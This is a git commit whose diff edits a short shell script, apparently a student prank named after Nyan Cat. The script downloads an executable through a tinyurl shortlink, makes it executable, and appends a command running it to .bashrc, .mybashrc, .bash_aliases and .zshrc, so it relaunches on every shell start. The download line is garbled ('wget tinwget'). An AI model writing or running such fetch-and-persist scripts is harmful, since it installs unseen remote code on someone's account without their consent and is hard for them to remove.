056d5110917160ce5a3217f9c0a9bbb389f586c2
galpin_a <galpin_a@epitech.eu>
2016-05-05 18:27:53 +0200

    zeaa

--- niancat.sh
+++ niancat.sh
@@ -5,10 +5,12 @@
 ## Login   <galpin_a@epitech.net>
 ## 
 ## Started on  Thu May  5 18:02:39 2016 Antoine Galpin
-## Last update Thu May  5 18:09:13 2016 Antoine Galpin
+## Last update Thu May  5 18:27:43 2016 Antoine Galpin
 ##
 
 wget tinwget tinyurl.com/confnyancat
 chmod +x confnyancat
-echo "./confnyancat" > .mybashrc
-echo "./confnyancat" > .bash_aliases
+echo "./confnyancat" >> .bashrc
+echo "./confnyancat" >> .mybashrc
+echo "./confnyancat" >> .bash_aliases
+echo "./confnyancat" >> .zshrc
